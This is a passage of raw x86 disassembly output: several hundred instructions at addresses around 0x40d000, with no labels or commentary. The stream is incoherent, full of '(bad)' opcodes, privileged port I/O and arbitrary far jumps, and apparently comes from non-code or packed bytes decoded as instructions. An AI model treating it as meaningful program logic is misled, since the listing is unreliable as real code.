  40cfbf:	mov    cl,0x25
  40cfc1:	not    DWORD PTR [ebx-0x49577931]
  40cfc7:	loope  0x40cfa6
  40cfc9:	fdivr  QWORD PTR [ebx]
  40cfcb:	cmp    al,0xaf
  40cfcd:	push   ebx
  40cfce:	jae    0x40cf8a
  40cfd0:	in     al,0xf2
  40cfd2:	stos   BYTE PTR es:[edi],al
  40cfd3:	add    bl,BYTE PTR [edx]
  40cfd5:	retf   0x5035
  40cfd8:	adc    DWORD PTR [ecx+0x7a590cc8],ebp
  40cfde:	mov    bh,0x3a
  40cfe0:	dec    ebx
  40cfe1:	or     BYTE PTR gs:[ecx],bl
  40cfe4:	in     eax,dx
  40cfe5:	mov    ds:0xaad1fa83,al
  40cfea:	xchg   esi,eax
  40cfeb:	fst    DWORD PTR [eax+0x56]
  40cfee:	push   es
  40cfef:	out    0xd0,al
  40cff1:	ds std 
  40cff3:	shl    bh,0x11
  40cff6:	sub    BYTE PTR [eax-0x4bc54819],bh
  40cffc:	ret    
  40cffd:	cmp    esp,0xff87f860
  40d003:	or     eax,0xec8ca096
  40d008:	mov    bh,0x1b
  40d00a:	popf   
  40d00b:	in     al,dx
  40d00c:	pop    esi
  40d00d:	cmp    BYTE PTR [eax+0x72d33f52],ch
  40d013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d014:	mov    gs,WORD PTR [esi+0x77f9455e]
  40d01a:	sbb    eax,0x153dfbf8
  40d01f:	mov    edx,DWORD PTR [eax]
  40d021:	mov    bl,BYTE PTR [ecx]
  40d023:	jl     0x40d041
  40d025:	stc    
  40d026:	pop    ds
  40d027:	push   edi
  40d028:	and    ah,cl
  40d02a:	(bad)  
  40d02b:	in     al,0xb3
  40d02d:	push   edx
  40d02e:	push   edi
  40d02f:	mov    DWORD PTR [esp+ebp*4+0x7f],ebx
  40d033:	add    BYTE PTR [eax+esi*8-0x26],dh
  40d037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d038:	imul   edi,DWORD PTR [ebx],0xffffffb2
  40d03b:	or     bl,BYTE PTR [eax+ecx*8+0x2d]
  40d03f:	jl     0x40d043
  40d041:	pop    ds
  40d042:	and    dh,BYTE PTR [eax-0x80]
  40d045:	retf   
  40d046:	outs   dx,DWORD PTR ds:[esi]
  40d047:	out    0x90,al
  40d049:	xor    al,0xd1
  40d04b:	xchg   edi,eax
  40d04c:	jmp    DWORD PTR [eax+0x731498aa]
  40d052:	in     al,0x7e
  40d054:	add    cl,BYTE PTR ds:0xa6188dd2
  40d05a:	das    
  40d05b:	leave  
  40d05c:	and    ebx,DWORD PTR ds:0xc2f0b5ff
  40d062:	and    al,0x82
  40d064:	not    BYTE PTR [ebp-0x44a6359a]
  40d06a:	xchg   BYTE PTR [eax],dl
  40d06c:	xchg   edx,eax
  40d06d:	shl    bh,0x7
  40d070:	data16 das 
  40d072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d073:	mov    ch,0x68
  40d075:	adc    BYTE PTR [ebp+edx*4-0x350cf64b],cl
  40d07c:	shr    DWORD PTR [eax],1
  40d07e:	mov    WORD PTR [esi-0x48e1cf00],fs
  40d084:	and    al,0x81
  40d086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d087:	idiv   DWORD PTR [edx-0x49bfcbe8]
  40d08d:	pusha  
  40d08e:	add    eax,0xf7224b75
  40d093:	test   eax,0xf1b87cb
  40d098:	mov    dl,0x21
  40d09a:	ja     0x40d10f
  40d09c:	sbb    bh,BYTE PTR [ebp*2+0x3b0e3181]
  40d0a3:	(bad)  
  40d0a4:	dec    esp
  40d0a5:	icebp  
  40d0a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0a7:	outs   dx,BYTE PTR ds:[esi]
  40d0a8:	jg     0x40d07f
  40d0aa:	add    BYTE PTR [ecx-0x64],ch
  40d0ad:	mov    al,0x32
  40d0af:	jp     0x40d0da
  40d0b1:	inc    eax
  40d0b2:	and    al,0x65
  40d0b4:	sbb    bl,BYTE PTR [ebp-0x3df2ac59]
  40d0ba:	imul   esp,DWORD PTR [esp+ebx*2-0x52],0x7c4407d8
  40d0c2:	test   al,0xd0
  40d0c4:	retf   0x69c
  40d0c7:	sub    bl,ch
  40d0c9:	jecxz  0x40d146
  40d0cb:	(bad)  
  40d0cc:	pop    es
  40d0cd:	add    al,BYTE PTR [edi-0x56148a4a]
  40d0d3:	push   esi
  40d0d4:	es push edi
  40d0d6:	jg     0x40d146
  40d0d8:	in     eax,dx
  40d0d9:	and    esi,edi
  40d0db:	and    BYTE PTR [ebx+eiz*4],al
  40d0de:	ret    
  40d0df:	mov    edx,0x582a617b
  40d0e4:	add    eax,DWORD PTR [eax-0x2d0644c2]
  40d0ea:	cwde   
  40d0eb:	cmc    
  40d0ec:	inc    eax
  40d0ed:	jmp    0x36c3:0x1801ba
  40d0f4:	cmp    DWORD PTR [edi-0x1c],edx
  40d0f7:	xchg   ebx,eax
  40d0f8:	push   edi
  40d0f9:	adc    ch,BYTE PTR [edi]
  40d0fb:	call   0x7bdff25
  40d100:	or     al,0x1d
  40d102:	fild   WORD PTR [esp+eax*2]
  40d105:	fsubr  DWORD PTR [edx]
  40d107:	cmp    esp,esp
  40d109:	xor    BYTE PTR [edi-0x76],bl
  40d10c:	addr16 push esi
  40d10e:	xor    BYTE PTR [ecx+0x10],bh
  40d111:	xchg   edi,eax
  40d112:	jp     0x40d140
  40d114:	(bad)  
  40d115:	call   0xf43ea250
  40d11a:	ror    BYTE PTR [ecx-0x79],1
  40d11d:	adc    al,0xd9
  40d11f:	sub    eax,DWORD PTR [edi+0x77]
  40d122:	popa   
  40d123:	push   edi
  40d124:	in     al,0xef
  40d126:	cs xchg ebp,eax
  40d128:	fcmovu st,st(3)
  40d12a:	dec    eax
  40d12b:	push   ecx
  40d12c:	adc    eax,0xb09f5b96
  40d131:	aad    0xdd
  40d133:	stc    
  40d134:	std    
  40d135:	imul   eax,DWORD PTR [ebp-0x80],0x89d1aaef
  40d13c:	std    
  40d13d:	and    DWORD PTR [ebx-0x45dadfbd],eax
  40d143:	push   ebx
  40d144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d145:	ja     0x40d173
  40d147:	sbb    DWORD PTR [edi+edx*2],ebp
  40d14a:	fs sbb al,0xff
  40d14d:	addr16 jmp 0x6fbf:0xebe0347e
  40d155:	lahf   
  40d156:	sahf   
  40d157:	mov    dl,0xfa
  40d159:	ret    0x6a38
  40d15c:	add    ch,BYTE PTR [ebp+0x2f]
  40d15f:	sbb    al,0x30
  40d161:	inc    edx
  40d162:	xor    eax,0x5465c71b
  40d167:	in     eax,0xf8
  40d169:	or     ecx,eax
  40d16b:	(bad)  
  40d16c:	adc    BYTE PTR [ebx+0x78b1bef3],dh
  40d172:	imul   ebx,DWORD PTR [eax+0x18],0xbf770cb0
  40d179:	data16 mov ah,0x47
  40d17c:	inc    ebp
  40d17d:	dec    ebx
  40d17e:	sbb    eax,ecx
  40d180:	fdiv   st(2),st
  40d182:	cmp    ebp,edx
  40d184:	jl     0x40d1cc
  40d186:	add    DWORD PTR [esi-0x4d],edx
  40d189:	xor    ch,BYTE PTR [ebx]
  40d18b:	sbb    edx,ebp
  40d18d:	and    BYTE PTR [edx],bh
  40d18f:	inc    eax
  40d190:	idiv   BYTE PTR [eax+0x50f3a41f]
  40d196:	push   ds
  40d197:	mov    eax,0x96087ea1
  40d19c:	pop    ecx
  40d19d:	push   edx
  40d19e:	pop    ebp
  40d19f:	loope  0x40d16b
  40d1a1:	pop    es
  40d1a2:	mov    cl,0x3
  40d1a4:	fsubr  st,st(5)
  40d1a6:	add    ebx,eax
  40d1a8:	sbb    bh,ah
  40d1aa:	or     ebp,0x6a
  40d1ad:	xor    eax,DWORD PTR [edx]
  40d1af:	mov    ah,0x71
  40d1b1:	adc    BYTE PTR [ebx+0x1b],dh
  40d1b4:	dec    ebx
  40d1b5:	jbe    0x40d221
  40d1b7:	mov    esi,0xf9ed331d
  40d1bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1bd:	jge    0x40d1b5
  40d1bf:	or     dh,BYTE PTR [ecx-0x40]
  40d1c2:	popa   
  40d1c3:	icebp  
  40d1c4:	sti    
  40d1c5:	into   
  40d1c6:	out    dx,al
  40d1c7:	dec    ebp
  40d1c8:	jg     0x40d1b1
  40d1ca:	sub    al,BYTE PTR [ecx-0x2f]
  40d1cd:	ret    
  40d1ce:	add    al,0x6a
  40d1d0:	inc    edx
  40d1d1:	pop    ebp
  40d1d2:	pop    ds
  40d1d3:	mov    bl,0x1
  40d1d5:	or     esi,DWORD PTR [ebp-0x4109f64e]
  40d1db:	mov    ?,ebp
  40d1dd:	push   es
  40d1de:	es sahf 
  40d1e0:	jb     0x40d216
  40d1e2:	lahf   
  40d1e3:	cdq    
  40d1e4:	xchg   ebp,eax
  40d1e5:	fs dec eax
  40d1e7:	xchg   ebp,eax
  40d1e8:	adc    ebx,esi
  40d1ea:	pop    esi
  40d1eb:	and    eax,0xe1e6b5f3
  40d1f0:	push   cs
  40d1f1:	test   dh,dh
  40d1f3:	mov    cl,0xe3
  40d1f5:	xor    dl,BYTE PTR [eax+0x4b]
  40d1f8:	enter  0x5871,0x97
  40d1fc:	and    BYTE PTR [ebx+0x3609ee49],0xd2
  40d203:	push   edx
  40d204:	jmp    0x43d665a4
  40d209:	inc    ecx
  40d20a:	lods   al,BYTE PTR ds:[esi]
  40d20b:	pop    ebp
  40d20c:	xchg   ecx,eax
  40d20d:	test   ecx,0xc047918b
  40d213:	daa    
  40d214:	adc    ch,ch
  40d216:	int    0x4b
  40d218:	aaa    
  40d219:	das    
  40d21a:	jae    0x40d1cf
  40d21c:	push   cs
  40d21d:	xor    al,0xa8
  40d21f:	push   ds
  40d220:	es jge 0x40d22d
  40d223:	jge    0x40d26e
  40d225:	xchg   edx,eax
  40d226:	sub    al,0x7e
  40d228:	das    
  40d229:	xor    cl,BYTE PTR [edi+0x56]
  40d22c:	stos   BYTE PTR es:[edi],al
  40d22d:	pop    edi
  40d22e:	out    0x9a,eax
  40d230:	aaa    
  40d231:	jns    0x40d226
  40d233:	xor    DWORD PTR [eax+0x63fd1cbd],ecx
  40d239:	xor    BYTE PTR [eax+0x69],cl
  40d23c:	ror    DWORD PTR [ebp+0x56],1
  40d23f:	jo     0x40d269
  40d241:	xor    BYTE PTR [ecx+eiz*1-0x4f467ade],ah
  40d248:	sub    BYTE PTR [edi],dl
  40d24a:	push   0x2025fce8
  40d24f:	pop    esp
  40d250:	lock xor bh,BYTE PTR [ebp+0x45]
  40d254:	jno    0x40d2a2
  40d256:	xchg   ebx,eax
  40d257:	scas   eax,DWORD PTR es:[edi]
  40d258:	pop    edx
  40d259:	jne    0x40d274
  40d25b:	jbe    0x40d272
  40d25d:	mov    eax,ds:0xc7ca9be5
  40d262:	popf   
  40d263:	mov    edi,0x5a3aaca3
  40d268:	ja     0x40d27b
  40d26a:	mov    ah,0x18
  40d26c:	jecxz  0x40d2c9
  40d26e:	sub    eax,0x9c53bbb0
  40d273:	test   DWORD PTR [esi+0x36],eax
  40d276:	jmp    0xd20b4d85
  40d27b:	mov    al,0xa5
  40d27d:	test   DWORD PTR [ecx+0x792b4c00],edx
  40d283:	dec    ebp
  40d284:	lea    ebp,[edi+0x545326f3]
  40d28a:	loop   0x40d22d
  40d28c:	jo     0x40d2d9
  40d28e:	push   ebp
  40d28f:	stc    
  40d290:	add    dl,dh
  40d292:	and    BYTE PTR [ebx+0x78],cl
  40d295:	xchg   DWORD PTR [edx-0x2a],esp
  40d298:	in     al,0x93
  40d29a:	jg     0x40d31b
  40d29c:	test   DWORD PTR [ebp-0x7ab5f12],ecx
  40d2a2:	mov    eax,ds:0xe2a47438
  40d2a7:	test   ebx,0x8750754c
  40d2ad:	mov    ds:0x12280019,al
  40d2b2:	call   0x21bf08ea
  40d2b7:	(bad)
  40d2bb:	in     eax,0xe6
  40d2bd:	cmp    esp,DWORD PTR [edx]
  40d2bf:	add    eax,0x3dda7229
  40d2c4:	push   0xf8f6cb61
  40d2c9:	out    dx,al
  40d2ca:	sti    
  40d2cb:	mov    ch,0x77
  40d2cd:	dec    ebx
  40d2ce:	mov    dh,0x3e
  40d2d0:	je     0x40d269
  40d2d2:	sbb    ecx,DWORD PTR [ecx]
  40d2d4:	inc    edi
  40d2d5:	test   dl,bl
  40d2d7:	pop    ecx
  40d2d8:	std    
  40d2d9:	jne    0x40d319
  40d2db:	mov    eax,DWORD PTR [ecx-0x7e]
  40d2de:	adc    DWORD PTR [esi],esp
  40d2e0:	popa   
  40d2e1:	or     edi,DWORD PTR [esi+0x5e]
  40d2e4:	sub    ecx,ebp
  40d2e6:	sub    dl,bl
  40d2e8:	js     0x40d2a2
  40d2ea:	cld    
  40d2eb:	or     al,0x1e
  40d2ed:	(bad)  
  40d2ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ef:	adc    al,bl
  40d2f1:	xchg   esi,eax
  40d2f2:	fucom  st(3)
  40d2f4:	add    al,BYTE PTR [eax-0x4d1e3702]
  40d2fa:	sub    esp,DWORD PTR [eax+0x6e]
  40d2fd:	adc    eax,0xdc021511
  40d302:	out    0x70,al
  40d304:	pop    ecx
  40d305:	xor    DWORD PTR [edi+0x922c143],eax
  40d30b:	mov    ebp,0x8aa75c6a
  40d310:	adc    dh,BYTE PTR [eax-0x59]
  40d313:	mov    esi,eax
  40d315:	xchg   edx,eax
  40d316:	rol    DWORD PTR [edi+0x58],0x18
  40d31a:	cdq    
  40d31b:	or     cl,BYTE PTR [ecx+edi*8]
  40d31e:	mov    esi,0x97166e07
  40d323:	push   ebx
  40d324:	and    ebp,ebx
  40d326:	cs in  eax,dx
  40d328:	xor    eax,0x60a47d3
  40d32d:	test   DWORD PTR [eax],ebx
  40d32f:	cmp    eax,0x8c43e27a
  40d334:	out    0x64,eax
  40d336:	fisub  DWORD PTR [ebx+0x4f]
  40d339:	xchg   BYTE PTR [edi],ch
  40d33b:	jp     0x40d3bc
  40d33d:	inc    eax
  40d33e:	xor    BYTE PTR [esi-0x22],cl
  40d341:	inc    edx
  40d342:	ds cmp eax,0xe59414c4
  40d348:	(bad)  
  40d349:	dec    ecx
  40d34a:	fistp  WORD PTR [esi]
  40d34c:	sub    al,0xde
  40d34e:	push   edi
  40d34f:	fst    DWORD PTR [ecx]
  40d351:	call   0x1e0f7ff6
  40d356:	pop    ebx
  40d357:	ins    DWORD PTR es:[di],dx
  40d359:	ja     0x40d2e5
  40d35b:	mov    eax,0x47d39218
  40d360:	pop    ebx
  40d361:	push   0x83c9de87
  40d366:	inc    edi
  40d367:	cmp    ah,BYTE PTR [esi-0x1f45ff4e]
  40d36d:	mov    ah,0x98
  40d36f:	lahf   
  40d370:	das    
  40d371:	in     al,dx
  40d372:	cmp    BYTE PTR [ebp-0x8],bl
  40d375:	push   cs
  40d376:	fld    TBYTE PTR [edx+0x7d]
  40d379:	ret    0xa96b
  40d37c:	pushf  
  40d37d:	xor    ebx,edx
  40d37f:	push   ss
  40d380:	sub    al,0xbc
  40d382:	push   esi
  40d383:	push   ss
  40d384:	(bad)  
  40d385:	pusha  
  40d386:	cwde   
  40d387:	ja     0x40d36d
  40d389:	sub    al,0xdb
  40d38b:	dec    ecx
  40d38c:	adc    bh,BYTE PTR [edx-0x69]
  40d38f:	jbe    0x40d3d2
  40d391:	pop    ss
  40d392:	pop    es
  40d393:	ins    DWORD PTR es:[edi],dx
  40d394:	add    ch,dl
  40d396:	pop    esi
  40d397:	bnd jg 0x40d3cc
  40d39a:	fiadd  WORD PTR [eax]
  40d39c:	xor    eax,0x3faaf4e2
  40d3a1:	mov    ah,0xdd
  40d3a3:	(bad)  
  40d3a4:	arpl   si,bp
  40d3a6:	ja     0x40d3a0
  40d3a8:	sub    esi,esi
  40d3aa:	xor    eax,0xb8a72899
  40d3af:	call   0x194d:0x64057964
  40d3b6:	rol    DWORD PTR [esi-0x75],1
  40d3b9:	shl    BYTE PTR [ebx-0x5ce36e2c],cl
  40d3bf:	add    BYTE PTR [edx],ch
  40d3c1:	adc    BYTE PTR [eax-0x7c],0xe1
  40d3c5:	push   ebp
  40d3c6:	and    cl,ah
  40d3c8:	sub    BYTE PTR [eax-0x3fda7914],bh
  40d3ce:	mov    al,0xf8
  40d3d0:	ret    
  40d3d1:	sub    ah,BYTE PTR ds:0x772ba921
  40d3d7:	dec    esp
  40d3d8:	inc    ebx
  40d3d9:	retf   
  40d3da:	sti    
  40d3db:	sbb    edx,DWORD PTR [ecx*4+0x75fced74]
  40d3e2:	scas   eax,DWORD PTR es:[edi]
  40d3e3:	push   ebp
  40d3e4:	mov    eax,0xeabfe438
  40d3e9:	cmp    DWORD PTR [eax-0x6bfa0a7c],0xac515b94
  40d3f3:	jns    0x40d43c
  40d3f5:	and    eax,0x2f2ee420
  40d3fa:	into   
  40d3fb:	mov    eax,ds:0x51fbd0fe
  40d400:	(bad)  
  40d402:	js     0x40d429
  40d404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d405:	test   eax,0x2759fa84
  40d40a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d40b:	pop    ebp
  40d40c:	mov    ch,0x83
  40d40e:	jmp    0xa59d:0xd0b1e07d
  40d415:	cld    
  40d416:	jmp    0xdf38:0xf1c7dfef
  40d41d:	sub    al,0xf8
  40d41f:	stos   BYTE PTR es:[edi],al
  40d420:	fsub   st(5),st
  40d422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d423:	push   ss
  40d424:	mov    esp,0x37e61402
  40d429:	arpl   WORD PTR [esi-0x349f0d15],sp
  40d42f:	add    edi,esp
  40d431:	dec    ebx
  40d432:	xchg   dl,dl
  40d434:	pop    ebx
  40d435:	lock aas 
  40d437:	inc    edx
  40d438:	into   
  40d439:	mov    dl,0x14
  40d43b:	loop   0x40d3d9
  40d43d:	jno    0x40d3ed
  40d43f:	mov    ds:0x34783f7,eax
  40d444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d445:	cmp    edx,DWORD PTR [edi]
  40d447:	imul   ecx,ecx,0xffffffde
  40d44a:	xlat   BYTE PTR ds:[ebx]
  40d44b:	out    dx,al
  40d44c:	fadd   QWORD PTR [ebx-0x25a215d3]
  40d452:	fstp   TBYTE PTR [eax+0x49e3f39a]
  40d458:	mov    ecx,DWORD PTR [edx]
  40d45a:	jns    0x40d440
  40d45c:	mov    ch,0xfa
  40d45e:	dec    BYTE PTR [ebx-0x7a34ccae]
  40d464:	xchg   DWORD PTR [ecx+0x1b7846b2],edi
  40d46a:	sub    ch,BYTE PTR [esi-0x387c9795]
  40d470:	xlat   BYTE PTR ds:[ebx]
  40d471:	and    edi,DWORD PTR [edx+0x6a]
  40d474:	sbb    ebp,ecx
  40d476:	xor    BYTE PTR ds:0xd458b3d3,al
  40d47c:	xor    al,0x37
  40d47e:	pop    eax
  40d47f:	adc    BYTE PTR [eax],0x7f
  40d482:	jle    0x40d4d2
  40d484:	popf   
  40d485:	mov    dl,0xb4
  40d487:	xor    bl,BYTE PTR [ebp-0x2e]
  40d48a:	fadd   DWORD PTR [ecx+0x3d528111]
  40d490:	cli    
  40d491:	bound  ecx,QWORD PTR [ecx-0x5d]
  40d494:	push   ebx
  40d495:	clc    
  40d496:	inc    esp
  40d497:	mov    bl,0x2c
  40d499:	sub    BYTE PTR [esp+esi*8-0x1f],dl
  40d49d:	test   esi,edx
  40d49f:	mov    ah,0x58
  40d4a1:	fwait
  40d4a2:	adc    DWORD PTR [ebx-0x5f],edx
  40d4a5:	ds sub eax,0xe7c2bba2
  40d4ab:	je     0x40d4a3
  40d4ad:	out    dx,al
  40d4ae:	fisub  DWORD PTR [edx-0x18289eb7]
  40d4b4:	mov    cl,0x82
  40d4b6:	cmc    
  40d4b7:	inc    edx
  40d4b8:	rsm    
  40d4ba:	out    dx,eax
  40d4bb:	jl     0x40d522
  40d4bd:	clc    
  40d4be:	adc    al,0xa1
  40d4c0:	inc    ecx
  40d4c1:	js     0x40d4aa
  40d4c3:	mov    esi,0xa576b3c3
  40d4c8:	dec    DWORD PTR [edi-0x2c]
  40d4cb:	test   BYTE PTR [ecx+0x18],0x60
  40d4cf:	cs and edx,ecx
  40d4d2:	pushf  
  40d4d3:	pop    ebp
  40d4d4:	rcr    DWORD PTR [eax-0x383329c1],0x95
  40d4db:	xor    eax,0xbd01267
  40d4e0:	test   al,0x4d
  40d4e2:	pushf  
  40d4e3:	std    
  40d4e4:	mov    BYTE PTR [esi],bl
  40d4e6:	out    0xe2,eax
  40d4e8:	cmp    ch,BYTE PTR [edi]
  40d4ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4eb:	les    edx,FWORD PTR [esi-0x48]
  40d4ee:	popf   
  40d4ef:	test   BYTE PTR [eax],0x21
  40d4f2:	repz xor BYTE PTR [ecx],0xf
  40d4f6:	mov    al,ds:0x571f482f
  40d4fb:	xor    DWORD PTR ds:0x686a6922,eax
  40d501:	sub    al,0x5a
  40d503:	inc    esp
  40d504:	push   ebx
  40d505:	ins    BYTE PTR es:[edi],dx
  40d506:	pop    eax
  40d507:	pop    esi
  40d508:	jge    0x40d57c
  40d50a:	push   cs
  40d50b:	ja     0x40d582
  40d50d:	popf   
  40d50e:	lea    esi,[ebx-0x33]
  40d511:	(bad)  
  40d512:	pop    ss
  40d513:	mov    al,0x1
  40d515:	lods   eax,DWORD PTR ds:[esi]
  40d516:	rol    BYTE PTR [ebx+0x57997e88],0x48
  40d51d:	push   eax
  40d51e:	pushf  
  40d51f:	xor    DWORD PTR [edi],esp
  40d521:	loop   0x40d52d
  40d523:	daa    
  40d524:	pop    ds
  40d525:	fistp  QWORD PTR [ebp-0x59da2362]
  40d52b:	nop
  40d52c:	leave  
  40d52d:	cmc    
  40d52e:	test   eax,0xdc4662f4
  40d533:	xchg   edi,eax
  40d534:	xlat   BYTE PTR ds:[ebx]
  40d535:	icebp  
  40d536:	pop    eax
  40d537:	dec    eax
  40d538:	jecxz  0x40d4c5
  40d53a:	dec    ebx
  40d53b:	mov    dl,BYTE PTR [edx+0x6f704192]
  40d541:	or     BYTE PTR [esi+eiz*2+0x66],al
  40d545:	add    eax,DWORD PTR [ebx-0x3f9767fd]
  40d54b:	sbb    al,0xd8
  40d54d:	aad    0x55
  40d54f:	mov    edi,0x9c6052c9
  40d554:	jb     0x40d5a6
  40d556:	sti    
  40d557:	push   es
  40d558:	sub    DWORD PTR [edi],ebx
  40d55a:	lods   al,BYTE PTR ds:[esi]
  40d55b:	mov    ebp,0xee802560
  40d560:	pusha  
  40d561:	lods   al,BYTE PTR ds:[esi]
  40d562:	jp     0x40d547
  40d564:	sbb    DWORD PTR [ecx],0xffffffe5
  40d567:	cld    
  40d568:	aaa    
  40d569:	xchg   ecx,eax
  40d56a:	fsubr  DWORD PTR [ebx-0x523de88f]
  40d570:	shl    DWORD PTR [ebx-0x61],1
  40d573:	adc    bl,ch
  40d575:	lods   eax,DWORD PTR ds:[esi]
  40d576:	push   ebx
  40d577:	xor    DWORD PTR [edi+ebx*4],ebx
  40d57a:	push   eax
  40d57b:	mov    ah,0x82
  40d57d:	or     ch,BYTE PTR [edi+0x35]
  40d580:	retf   
  40d581:	xchg   ebp,eax
  40d582:	cs hlt 
  40d584:	jecxz  0x40d546
  40d586:	xor    BYTE PTR [ecx],ah
  40d588:	pop    es
  40d589:	pop    ds
  40d58a:	mov    dl,0xd4
  40d58c:	inc    cx
  40d58e:	push   es
  40d58f:	sbb    al,0xe
  40d591:	test   al,0x8d
  40d593:	mov    eax,ebp
  40d595:	shr    DWORD PTR [esi+0x399f5f3a],cl
  40d59b:	lods   eax,DWORD PTR ds:[esi]
  40d59c:	or     al,0x19
  40d59e:	or     dh,BYTE PTR [esi]
  40d5a0:	add    BYTE PTR [ebp-0x3289e297],bl
  40d5a6:	in     eax,0x0
  40d5a8:	adc    cl,BYTE PTR [ebp-0x4a]
  40d5ab:	pop    ebp
  40d5ac:	cld    
  40d5ad:	inc    eax
  40d5ae:	rol    esi,1
  40d5b0:	into   
  40d5b1:	push   ecx
  40d5b2:	out    0x30,al
  40d5b4:	cmp    esp,ebx
  40d5b6:	repnz xor DWORD PTR [ebp+0x642c729f],ebp
  40d5bd:	sbb    eax,0xe93e2e09
  40d5c2:	add    eax,0xed1ec42d
  40d5c7:	mov    al,ds:0xca908745
  40d5cc:	inc    ebx
  40d5cd:	sub    ecx,DWORD PTR [eax]
  40d5cf:	aam    0xc2
  40d5d1:	xlat   BYTE PTR ds:[ebx]
  40d5d2:	ins    DWORD PTR es:[edi],dx
  40d5d3:	mov    eax,0x2f07d3ce
  40d5d8:	(bad)  
  40d5d9:	das    
  40d5da:	lea    edx,[edx+esi*1]
  40d5dd:	loop   0x40d5b7
  40d5df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5e0:	xor    DWORD PTR [ebp-0x5d],edi
  40d5e3:	dec    ecx
  40d5e4:	(bad)  
  40d5e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5e6:	es xchg ecx,eax
  40d5e8:	mov    ch,0x5b
  40d5ea:	shl    BYTE PTR [ebp+0x4d],cl
  40d5ed:	ror    BYTE PTR [edi],1
  40d5ef:	cli    
  40d5f0:	in     al,dx
  40d5f1:	inc    DWORD PTR [ecx+0x69277ebd]
  40d5f7:	cmp    dh,BYTE PTR [edx-0x7e8766d1]
  40d5fd:	xchg   DWORD PTR [ecx],esi
  40d5ff:	aad    0xad
  40d601:	or     dh,BYTE PTR [ebp+0x1de36c07]
  40d607:	sbb    esi,DWORD PTR [esi+0x113896bb]
  40d60d:	mov    edx,0x1707bb64
  40d612:	pop    ds
  40d613:	dec    ecx
  40d614:	xor    bh,BYTE PTR [ebx]
  40d616:	push   0x276091bd
  40d61b:	sbb    dh,BYTE PTR [eax]
  40d61d:	xor    eax,0x348191
  40d622:	cli    
  40d623:	sbb    ebx,ecx
  40d625:	push   ss
  40d626:	pushf  
  40d627:	clc    
  40d628:	or     eax,0x4f359e3
  40d62d:	(bad)  
  40d62e:	mov    ecx,0x38428bbf
  40d633:	sub    eax,0xf3d8d586
  40d638:	int    0x99
  40d63a:	in     eax,dx
  40d63b:	and    ebx,edx
  40d63d:	mov    esp,0xf83b8d9a
  40d642:	mov    bl,BYTE PTR [ecx+0x23c5eec8]
  40d648:	pop    esp
  40d649:	dec    edx
  40d64a:	dec    ebx
  40d64b:	mov    esp,0xeeff5334
  40d650:	mov    bl,0x56
  40d652:	jb     0x40d6b6
  40d654:	enter  0xce93,0x5e
  40d658:	call   0xd735772a
  40d65d:	adc    BYTE PTR [ebx],dh
  40d65f:	push   ebx
  40d660:	inc    edi
  40d661:	pushf  
  40d662:	js     0x40d60f
  40d664:	or     BYTE PTR [esi+esi*4+0x5df885c8],ah
  40d66b:	dec    ecx
  40d66c:	cwde   
  40d66d:	xchg   BYTE PTR [edx-0x57],dh
  40d670:	data16 sbb BYTE PTR [ebx-0x60],dl
  40d674:	nop
  40d675:	mov    ds:0x54e29b41,al
  40d67a:	cmp    edi,DWORD PTR [esi]
  40d67c:	rol    BYTE PTR [ebx-0x242fc5e7],1
  40d682:	ins    DWORD PTR es:[edi],dx
  40d683:	daa    
  40d684:	or     dh,bl
  40d686:	call   0xc27dcff7
  40d68b:	inc    eax
  40d68c:	inc    ecx
  40d68d:	fmul   QWORD PTR [ebx+0x5028d7e]
  40d693:	pop    ebx
  40d694:	mov    ecx,0x2ee3b390
  40d699:	pop    ds
  40d69a:	push   esi
  40d69b:	adc    eax,0xe506f6b5
  40d6a0:	and    eax,0xab4e3392
  40d6a5:	sbb    BYTE PTR [ebx],dl
  40d6a7:	push   ebp
  40d6a8:	aam    0xcb
  40d6aa:	mov    ds:0xeb89f8aa,eax
  40d6af:	xchg   esi,edx
  40d6b1:	sar    DWORD PTR [ebx+0x7e],0xc0
  40d6b5:	xlat   BYTE PTR ds:[ebx]
  40d6b6:	pop    ebp
  40d6b7:	mov    bl,0xd4
  40d6b9:	leave  
  40d6ba:	lahf   
  40d6bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6bc:	push   ebx
  40d6bd:	mov    edi,0xb8a0eb3f
  40d6c2:	sbb    dl,BYTE PTR [ecx-0x5b15dfc6]
  40d6c8:	lods   al,BYTE PTR ds:[esi]
  40d6c9:	je     0x40d6c2
  40d6cb:	jmp    0x5b28:0x825d0fd3
  40d6d2:	mov    dl,0xf1
  40d6d4:	jb     0x40d751
  40d6d6:	std    
  40d6d7:	ins    DWORD PTR es:[edi],dx
  40d6d8:	cdq    
  40d6d9:	xor    al,0xe0
  40d6dc:	int3   
  40d6dd:	(bad)  
  40d6de:	icebp  
  40d6df:	mov    dh,0xf
  40d6e1:	mov    al,0xda
  40d6e3:	ret    0x1028
  40d6e6:	cmp    eax,0x5701e8db
  40d6eb:	nop
  40d6ec:	mov    esp,0x6ca190a4
  40d6f1:	rcr    DWORD PTR [eax-0x6dfe6c09],1
  40d6f7:	jmp    0x3494:0xe7b0629
  40d6fe:	ins    BYTE PTR es:[edi],dx
  40d6ff:	arpl   WORD PTR [edx],bx
  40d701:	sub    BYTE PTR [esi],0x69
  40d704:	(bad)  
  40d705:	jl     0x40d6c0
  40d707:	out    dx,al
  40d708:	lock out dx,eax
  40d70a:	sahf   
  40d70b:	pop    ebx
  40d70c:	jb     0x40d6e8
  40d70e:	loope  0x40d777
  40d710:	pusha  
  40d711:	scas   al,BYTE PTR es:[edi]
  40d712:	cmp    cl,cl
  40d714:	fmul   QWORD PTR [eax-0x22]
